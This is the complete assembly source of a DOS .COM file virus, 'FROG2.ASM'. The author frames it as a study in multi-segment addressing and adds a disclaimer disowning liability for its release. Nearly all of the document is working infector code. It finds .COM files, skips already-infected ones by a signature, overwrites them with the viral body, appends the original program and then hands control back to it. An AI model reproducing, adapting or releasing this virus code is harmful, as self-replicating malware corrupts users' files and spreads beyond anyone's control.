;****************************************************************************
;Title: FROG2.ASM
;Assembler: MASM 6.11
;Author: ACKME_LABS
;
;Purpose: A .COM file infector that uses 3 different segments in the process
;of performing its work. i did it this way as a study in multi-segment-
;addressing. really, it could have been done using only 2 segments. the
;comments in the listing are pretty clear so ne need to get into more detail
;here. still-this could use some economizing. . . . .
;****************************** N O T I C E *********************************
;because this is the source code for a fully functional virus-anyone possesing
;it accepts all responsibility and liability for its release, intentionally
;or otherwise. T H E   A U T H O R   R E M A I N S   B L A M E L E S S
;****************************************************************************

.MODEL TINY                             ;.COM file

.CODE                                   ;set up segment registers

.STARTUP                                ;org 100h

VIRUS_START:                            ;label for start of viral code
JMP     SET_SEGMENT                     ;jump-over signature

DB      'EM'                            ;this virus' signature

;**************** THIS SECTION JUMPS US TO THE NEXT SEGMENT *****************
;the way this section works is by jumping to a big number. basically, the FAR
;jump loads CS with 1000h and loads IP with 100h, but first we initialize
;the 1000 nth element in SI with 1000h our upper segment, then we initialize
;the 1000 nth element-2 with our offset which will be 100h------------------
;thus CS:IP=1000H:100h. you could do this easier by loading DS and AX with
;CS:IP then a couple pushes then a RETF, but this is more fun.

SET_SEGMENT:
        MOV     SI,CS                   ;put the current segment into SI
        ADD     SI,1000H                ;add 1000h to it-the next segment-up
        MOV     DI,SI                   ;point to the xxxx element there
        MOV     [DI],SI                 ;put 1000H in xxxx element-wkn'g seg.
        MOV     AX,OFFSET START-OFFSET VIRUS_START ;set IP with starting-
        ADD     AX,100H                            ;offset
        MOV     [DI]-2,AX               ;will be our starting offset in the
        PUSH    SI                      ;save SI-we need it for MOVSB
        MOV     ES,SI
        MOV     DI,100H                 ;write our virus to 100H in next seg.
        MOV     SI,OFFSET VIRUS_START   ;write from here
        CLD
        MOV     CX,OFFSET VIRUS_END-OFFSET VIRUS_START ;this many bytes
        ADD     CX,WORD PTR [HOST_SIZE]
        REP     MOVSB
        POP     SI                      ;restore SI-our jump address
        JMP     FAR PTR [SI]-2          ;upper segment-now jump to it

;**************************** WORK STARTS HERE ******************************
START:  MOV     DX,OFFSET DTA
        CALL    SET_DTA
        MOV     DX,OFFSET COMFILE
        CALL    FIND_FIRST

FOK_LOOP:
        OR      AL,AL                   ;did DOS return error?
        JNZ     TO_HOST                 ;yes so exit
        JMP     CHK_FILE                ;is file o.k. to infect?
F_NEXT:
        MOV     AH,4FH                  ;DOS function find next file
        INT     21H
        JC      TO_HOST                 ;no more files found-exit
        JMP     FOK_LOOP                ;did DOS return error?

CHK_FILE:
        MOV     DX,OFFSET FNAME
        CALL    OPEN_FILE
        MOV     WORD PTR HANDLE,AX      ;save the file handle
        MOV     BX,[HANDLE]             ;now position it for read-oper.
        MOV     CX,5                    ;read 5 bytes from infectee
        MOV     DX,100H                 ;use lower segment as a buffer
        ADD     DX,OFFSET VIRUS_END-OFFSET VIRUS_START
        CALL    READ_FILE               ;but do not overwrite the PSP, etc
        MOV     DI,100H                 ;move the 2nd 2 bytes into AX
        ADD     DI,OFFSET VIRUS_END-OFFSET VIRUS_START
        MOV     AX,[DI+2]
        CMP     AX,4D45H                ;check for signature
        JZ      F_NEXT                  ;it's already infected-fetch another
        MOV     AX,FSIZE                ;see if file is too big to infect
        ADD     AX,OFFSET VIRUS_END-OFFSET VIRUS_START
        ADD     AX,1000                 ;for good measure
        JC      F_NEXT                  ;it's too big-find another one

;************************** THE INFECTION PROCESS ***************************
;o.k. we got this far-now we have to read the ENTIRE infectee into the next
;segment because we will then overwrite the infectee's file  with the viral
;code then re-write the original infectee from the lower upper to the END
;of the file.
INFECT: INT     03H                     ;otherwise. . . . . . . . .
        XOR     CX,CX                   ;move the file pointer to the
        MOV     DX,CX                   ;begining of infectee in preparation
        MOV     AL,00H                  ;for infection
        CALL    MOVE_POINTER
        MOV     BX,[HANDLE]             ;make sure file handle is in place
        MOV     CX,[FSIZE]              ;read in the whole file
        MOV     SI,CS                   ;set-up DS:DX for reading infectee
        ADD     SI,1000H                ;segment above this one
        MOV     DX,SI
        PUSH    DS                      ;save DS
        MOV     DS,SI                   ;DS:DX must point buffer
        CALL    READ_FILE               ;in the lower segment
        POP     DS                      ;restore previous data segment
        XOR     CX,CX                   ;move the file pointer to the
        MOV     DX,CX                   ;begining of infectee-file
        MOV     AL,00H                  ;in preparation to write viral code
        CALL    MOVE_POINTER
        MOV     CX,OFFSET VIRUS_END-OFFSET VIRUS_START
        MOV     DX,CS:OFFSET VIRUS_START
        CALL    WRITE_FILE
        XOR     CX,CX                   ;move the file pointer to the
        MOV     DX,OFFSET FINISH-OFFSET VIRUS_START ;offset of finish
        MOV     AL,00H                  ;in preparation to write viral code
        CALL    MOVE_POINTER
        MOV     DX,100H                 ;write from lower segment
        ADD     DX,OFFSET VIRUS_END-OFFSET VIRUS_START
        ADD     DX,CS:WORD PTR [HOST_SIZE]
        MOV     CX,[FSIZE]
        CALL    WRITE_FILE
        XOR     CX,CX                   ;move the file pointer to the
        MOV     DX,OFFSET HOST_SIZE-OFFSET VIRUS_START ;offset of host_size
        MOV     AL,00H                  ;in preparation to write host's size
        CALL    MOVE_POINTER
        MOV     DX,OFFSET FSIZE
        MOV     CX,4
        CALL    WRITE_FILE
        XOR     CX,CX                   ;move the file pointer to the
        MOV     DX,OFFSET CS:FINISH-OFFSET CS:VIRUS_START
        MOV     AL,00H                  ;in preparation to write host's code
        CALL    MOVE_POINTER
        MOV     CX,[FSIZE]              ;wrote host's code
        MOV     DX,CS
        ADD     DX,1000H                ;64k above this segment is where we
        PUSH    DS                      ;save this data segment since we need
        MOV     DS,DX                   ;to set DS:DX to segment above this
        CALL    WRITE_FILE              ;one in order to access the data from
        POP     DS                      ;previous read operation
        MOV     AH,3EH                  ;then be sure to restore DS to prev.
        INT     21H                     ;then close the infectee file
        MOV     AH,1AH
        MOV     DX,80H                  ;now restore original DTA
        INT     21H

        MOV     SI,OFFSET FNAME
        CLD
        MOV     CX,13
PRINT_F:
        LODSB
        MOV     AH,0EH                  ;BIOS call-to be safe
        INT     10H                     ;print the file-name we just infected
        LOOP    PRINT_F
        JMP     TO_HOST                 ;all done get out

HOST_SIZE:                              ;just a place to store the size of
DB      5                               ;the host so we can know how many
DB      0                               ;bytes to initialize CX with on
DB      0                               ;our return to host to 100H i have
DB      0                               ;initialized to the size of:
                                        ;MOV    AX,4C00H
                                        ;INT    21H     =5 bytes

;********************* RETURN HOST TO 100H AND EXECUTE **********************
TO_HOST:
        MOV     AX,CS
        MOV     DS,AX
        MOV     DI,OFFSET CS:HOST_SIZE
        MOV     CX,[DI]
        MOV     SI,CS                   ;put the current segment into SI
        SUB     SI,1000H                ;add 1000h to it-the next segment-up
        MOV     DI,SI                   ;point to the xxxx element there
        MOV     [DI],SI                 ;put 1000H in xxxx element-wkn'g seg.
        MOV     AX,100H
        MOV     [DI]-2,AX               ;will be our starting offset in the
        PUSH    SI                      ;save SI-we need it for MOVSB
        MOV     ES,SI
        MOV     DI,100H                 ;write our virus to 100H in next seg.
        CLD
        MOV     SI,OFFSET FINISH        ;write from here
        REP     MOVSB                   ;now move host to lower SEG:100H
        MOV     AX,DS
        SUB     AX,1000H
        MOV     DS,AX
        POP     SI                      ;restore SI-our jump address
        JMP     FAR PTR CS:[SI]-2       ;lower SEG:100H-now jump to it
                                        ;but reference this segment
;****************************************************************************
SET_DTA PROC
        MOV     AH,1AH                  ;DOS function-set DTA
        INT     21H
        RET
SET_DTA ENDP

FIND_FIRST PROC
        MOV     AH,4EH                  ;DOS function-find first file
        INT     21H
        RET
FIND_FIRST ENDP

OPEN_FILE PROC
        MOV     AH,3DH                  ;DOS function open file
        MOV     AL,0002H                ;r/w/ access
        INT     21H
        RET
OPEN_FILE ENDP

READ_FILE PROC
        MOV     AH,3FH                  ;DOS function-read file
        INT     21H
        RET
READ_FILE ENDP

WRITE_FILE PROC
        MOV     AH,40H                  ;DOS function-write file
        INT     21H
        RET
WRITE_FILE ENDP

MOVE_POINTER PROC
        MOV     AH,42H                  ;DOS function-move file pointer
        INT     21H
        RET
MOVE_POINTER ENDP

COMFILE DB      '*.COM',0               ;search string for a comfile
DTA     DB      22 DUP(?)               ;work area for the search function
FTIME   DB      0,0                     ;time of original creation
FDATE   DB      0,0                     ;date of original creation
FSIZE   DW      0,0                     ;file size storage area
FNAME   DB      13 DUP(?)               ;area for file path
HANDLE  DW      0                       ;file handle
VIR_SIG DB      0,0,0,0,0               ;storage for first 5 bytes of host
                                        ;and jump distances

FINISH:
        MOV     AX,4C00H
        INT     21H

VIRUS_END:

END
